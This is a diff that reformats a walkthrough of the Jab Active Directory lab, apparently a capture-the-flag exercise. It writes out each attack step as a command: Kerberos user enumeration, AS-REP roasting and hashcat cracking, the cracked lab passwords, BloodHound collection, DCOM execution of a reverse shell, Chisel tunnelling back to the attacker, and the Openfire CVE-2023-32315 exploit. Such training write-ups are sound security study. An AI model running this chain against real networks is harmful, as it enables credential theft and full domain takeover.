@@ -1,143 +1,114 @@
-# Jab - Active Directory Exploitation Walkthrough
+Jab - Active Directory Lab Exploitation Walkthrough
+===================================================
 
-This walkthrough demonstrates the full exploitation of the **Jab** Active Directory lab environment. The assessment includes user enumeration, AS-REP roasting, SMB enumeration, BloodHound-based lateral movement, and remote code execution through Openfire (CVE-2023-32315) to achieve Domain Admin access.
+This is a full exploitation walkthrough for the Jab Active Directory lab. The goal was to gain Domain Admin privileges through Kerberos user enumeration, AS-REP roasting, lateral movement using BloodHound, and remote code execution through Openfire (CVE-2023-32315).
 
----
+Target Information
+------------------
+IP Address       : 10.10.11.4  
+Domain           : jab.htb  
+Domain Controller: dc01.jab.htb  
+Key Services     : Kerberos, SMB, LDAP, XMPP/Openfire
 
-## 🧠 Lab Information
+Enumeration
+-----------
+Performed an initial Nmap scan:
 
-- **IP Address:** 10.10.11.4
-- **Domain:** jab.htb
-- **Domain Controller:** dc01.jab.htb
-- **Services:** Kerberos, SMB, LDAP, XMPP/Openfire
-
----
-
-## 🔍 Enumeration
-
-### Nmap Scan
-
-```bash
 nmap -sC -sV -oA nmap 10.10.11.4
 
-Key Ports:
-88, 389, 636, 445 – Kerberos, LDAP, SMB
-5222, 5269, 7070, 7443, 7777 – XMPP (Openfire)
+Identified ports:
+- 88, 389, 636, 445 (Kerberos, LDAP, SMB)
+- 5222, 5269, 7070, 7443, 7777 (Openfire/XMPP)
 
-Add to /etc/hosts:
+Added to /etc/hosts:
+
 10.10.11.4 jab.htb dc01.jab.htb
-🔐 Kerberos & XMPP Enumeration
+
 Kerberos User Enumeration
-bash
-Copy
-Edit
+-------------------------
+Used kerbrute to enumerate valid usernames:
+
 kerbrute userenum --dc dc01.jab.htb -d jab.htb usernames.txt -o kerbrute.txt
 
-Thousands of users discovered.
-
 AS-REP Roasting
-bash
-Copy
-Edit
+---------------
 impacket-GetNPUsers jab.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-Crack Hash with Hashcat
-bash
-Copy
-Edit
+
+Cracked hashes with hashcat:
+
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
-Cracked Credential:
 
-jmontgomery : Midnight_121
+Recovered credentials:
+- jmontgomery : Midnight_121
 
-💬 XMPP Enumeration (Pidgin)
-Install and open Pidgin.
+XMPP Enumeration (Pidgin)
+-------------------------
+Logged into Openfire chat using Pidgin with cracked credentials. Discovered more users and credentials:
 
-Create new XMPP account using cracked credentials.
+- svc_openfire : !@#$%^&*(1qazxsw)
 
-Join chat rooms to discover additional usernames and messages.
-
-Found credentials:
-
-svc_openfire : !@#$%^&*(1qazxsw)
-
-📁 SMB Enumeration
-bash
-Copy
-Edit
+SMB Access
+----------
 smbmap -u svc_openfire -p '!@#$%^&*(1qazxsw)' -H 10.10.11.4
-Limited access, no sensitive data found.
 
-🧠 BloodHound Analysis
-Data Collection
-bash
-Copy
-Edit
+Found limited access, but no critical files.
+
+BloodHound & Lateral Movement
+-----------------------------
+Used bloodhound-python to enumerate AD relationships:
+
 bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw)' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4
-zip -r bloodhound.zip bloodhound/
-BloodHound GUI (Neo4j)
-Upload collected data.
 
-Identify attack path using DCOM and Remote Code Execution privileges.
+Uploaded to BloodHound and found attack path via DCOM privileges.
 
-🧨 Remote Code Execution via DCOM
-Reverse Shell Payload
-Generate a PowerShell reverse shell from revshells.com, then:
+Remote Code Execution via DCOM
+------------------------------
+Generated PowerShell payload and used DCOMExec from impacket:
 
-bash
-Copy
-Edit
-impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw)@dc01.jab.htb' '<PowerShellCommand>'
-Start listener:
+impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw)@dc01.jab.htb' '<powershell-reverse-shell>'
 
-bash
-Copy
-Edit
+Started listener:
+
 rlwrap nc -nlvp 6658
-✅ User Flag: 58b27f9faaec3dfdb2a94dad6a1e2175
 
-🔁 Pivoting with Chisel
-Setup Chisel Tunnel
-Server (Attacker):
+Captured User Flag:
+58b27f9faaec3dfdb2a94dad6a1e2175
 
-bash
-Copy
-Edit
+Pivot with Chisel
+-----------------
+Pivoted to access internal Openfire admin interface:
+
+Attacker (listener):
 chisel server -p 9999 --reverse
-Client (Victim):
 
-bash
-Copy
-Edit
-chisel client <YourIP>:9999 R:9090:127.0.0.1:9090
-Access Openfire admin: http://127.0.0.1:9090
+Victim:
+chisel client <attacker-ip>:9999 R:9090:127.0.0.1:9090
 
-⚙️ Exploiting Openfire (CVE-2023-32315)
-Exploit Setup
-bash
-Copy
-Edit
-git clone https://github.com/miko550/CVE-2023-32315.git
-cd CVE-2023-32315
-pip3 install -r requirements.txt
-Upload Malicious Plugin
-Login to Openfire admin panel.
+Accessed Openfire admin at: http://127.0.0.1:9090
 
-Use exploit to upload a reverse shell plugin.
+Exploitation - CVE-2023-32315
+-----------------------------
+Cloned exploit repo and uploaded plugin via Openfire admin panel:
 
-Catch Shell
-bash
-Copy
-Edit
+git clone https://github.com/miko550/CVE-2023-32315.git  
+cd CVE-2023-32315  
+pip3 install -r requirements.txt  
+
+Executed RCE and caught reverse shell:
+
 rlwrap nc -nlvp 4444
-✅ Root Flag: 8f826f76eb871e0566058e6580760e8e
 
-✅ Summary
-| Step                 | Technique                     | Result                          |
-| -------------------- | ----------------------------- | ------------------------------- |
-| User Enumeration     | Kerbrute, AS-REP roasting     | Found jmontgomery credentials   |
-| XMPP Enumeration     | Pidgin                        | Found svc\_openfire credentials |
-| Lateral Movement     | BloodHound (DCOM)             | Executed shell on DC            |
-| Privilege Escalation | Openfire RCE (CVE-2023-32315) | Gained SYSTEM shell             |
-| Flags Captured       | User & Root                   | Complete compromise             |
+Captured Root Flag:
+8f826f76eb871e0566058e6580760e8e
 
-Author: Farhanahmad Quraishi
+Summary
+-------
+- User enum via Kerberos
+- AS-REP roasting → credential cracking
+- Pivoting through XMPP → BloodHound → DCOM
+- Internal access to Openfire admin
+- Remote code execution using CVE-2023-32315
+
+Author
+------
+Farhanahmad Quraishi
